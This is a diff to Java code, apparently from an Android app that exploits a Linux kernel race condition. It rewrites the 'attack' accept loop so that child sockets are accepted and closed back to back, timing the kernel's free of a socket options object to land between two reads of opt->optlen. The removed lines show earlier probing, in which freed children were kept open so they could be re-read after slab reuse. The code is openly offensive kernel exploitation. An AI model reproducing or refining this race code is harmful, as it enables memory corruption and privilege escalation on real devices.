@@ -619,51 +619,26 @@ int[] fds = snapshotChildFds();
         if (fd < 0) {
             return;
         }
-
         long accepted = 0;
-        long anomalies = 0;
 
+        // Accept and close with nothing in between.
+        //
+        // Closing the child is what runs inet_sock_destruct() and frees the
+        // options object, so this loop decides when the free lands. Reading the
+        // options and passing the fd to the ring first would add microseconds,
+        // and microseconds is all the kernel's window is worth - the two reads
+        // of opt->optlen sit about two hundred nanoseconds apart.
         while (running.get() && attackFd == fd) {
-            int child = Native.acceptFd(fd);
-            if (child < 0) {
-                int err = -child;
-                // 11 is EAGAIN/EWOULDBLOCK, 4 is EINTR: both are retryable and
-                // must not end the loop.
-                if (err == 11 || err == 4) {
-                    continue;
-                }
-                // EBADF/ENOTSOCK mean the listener is gone; anything else is
-                // worth one line but not a spin.
-                Log.w(TAG, "attack accept failed errno=" + err);
+            long n = Native.acceptClose(fd, 4096);
+            if (n <= 0) {
                 break;
             }
-
-            accepted++;
-
-            String opts = Native.readFdOptions(child);
-
-            // Every clean child carries exactly the 40 byte option the SYN had.
-            if (!opts.startsWith("len=40")) {
-                anomalies++;
-                Log.w(TAG, "CHILD OPTION ANOMALY #" + anomalies
-                        + " after " + accepted + " children: " + opts);
-            } else if (accepted % 200 == 0) {
-                Log.i(TAG, "attack accepted=" + accepted + " anomalies=" + anomalies
-                        + " last=" + opts);
+            accepted += n;
+            if (accepted % 4096 == 0) {
+                Log.i(TAG, "attack accepted=" + accepted);
             }
-
-            // Hand the child to the ring instead of closing it straight away.
-            //
-            // A child whose request socket lost the ehash race keeps a pointer
-            // to an options object that was already freed, but the bytes still
-            // read back correctly until something else claims the slab slot.
-            // Holding a few children open lets the probe re-read them after
-            // forcing that reuse.
-            retainChild(child);
         }
-
-        Log.i(TAG, "attack accept loop ended, accepted=" + accepted
-                + " anomalies=" + anomalies);
+        Log.i(TAG, "attack accept loop ended, accepted=" + accepted);
     }
 
     /**
